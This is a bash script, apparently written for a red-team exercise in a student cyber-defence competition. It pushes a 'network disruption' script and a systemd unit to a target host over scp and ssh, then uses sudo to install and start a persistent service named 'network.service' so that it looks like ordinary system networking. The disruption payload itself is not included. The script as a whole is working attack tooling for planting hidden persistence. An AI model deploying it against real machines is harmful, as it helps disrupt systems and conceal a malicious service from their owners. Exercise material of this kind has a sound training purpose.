#!/bin/bash
#Gavin Hunsinger, Spring 2025, cdtfoxtrot

# Remote target details including name and IP address specified by the red team targeting blue team
echo "Enter target user name:"
read name
TARGET_USER="$name"

echo "Enter target IP address:"
read address
TARGET_HOST="$address"

TARGET_PATH="/home/$TARGET_USER"  # Store network disruption script and service file in home dir first

# Script and service file paths on local machine
LOCAL_SCRIPT="network.sh"
LOCAL_SERVICE="network.service"

# Ensure the required files exist before proceeding
if [ ! -f "$LOCAL_SCRIPT" ] || [ ! -f "$LOCAL_SERVICE" ]; then
    echo "Error: Missing script or service file!"
    exit 1
fi

echo "[+] Transferring files to $TARGET_HOST (storing in $TARGET_PATH first)..."

# Copy files to the remote user's home directory first
scp "$LOCAL_SCRIPT" "$LOCAL_SERVICE" "$TARGET_USER@$TARGET_HOST:$TARGET_PATH/"

echo "[+] Connecting to $TARGET_HOST to set up the service..."

# Connect to the remote machine and move the files into place as root/sudoer
# the disruption script (network.sh) is stored in /opt/ to specify that it is an optional service not required for the core OS
# alter network.sh's permissions to be executable
# move the system service file (network.service) to the service directory, reload the daemon, enable the service, and start it
ssh "$TARGET_USER@$TARGET_HOST" << EOF
    echo "[+] Moving files to correct locations..."
    sudo mv $TARGET_PATH/network.sh /opt/network.sh
    sudo chmod +x /opt/network.sh

    sudo mv $TARGET_PATH/network.service /etc/systemd/system/network.service
    
    echo "[+] Reloading systemd..."
    sudo systemctl daemon-reload
    
    echo "[+] Enabling and starting the service..."
    sudo systemctl enable network.service
    sudo systemctl start network.service
    
    echo "[+] Setup complete!"
EOF

echo "[+] Deployment complete!"
